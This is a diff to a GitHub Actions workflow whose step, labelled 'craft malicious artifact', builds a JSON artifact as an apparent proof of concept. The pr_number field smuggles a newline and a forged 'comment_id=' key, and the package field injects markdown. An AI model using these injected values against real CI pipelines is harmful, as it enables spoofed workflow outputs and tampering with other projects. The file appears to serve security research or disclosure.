@@ -8,12 +8,8 @@ jobs:
     steps:
       - name: craft malicious artifact
         run: |
-          jq -n \
-            --arg pr '23
-comment_id=6536628331' \
-            --arg pkg '**poc-injected-package-header**
-- [x] `backport-poc-1.0`' \
-            '{pr_number:$pr, packages:[$pkg]}' > pr-packages.json
+          PR=$(printf '23\ncomment_id=6536628331')
+          jq -n --arg pr "$PR" --arg pkg '**poc-injected-package-header**' '{pr_number:$pr, packages:[$pkg]}' > pr-packages.json
           cat pr-packages.json
       - uses: actions/upload-artifact@v7
         with:
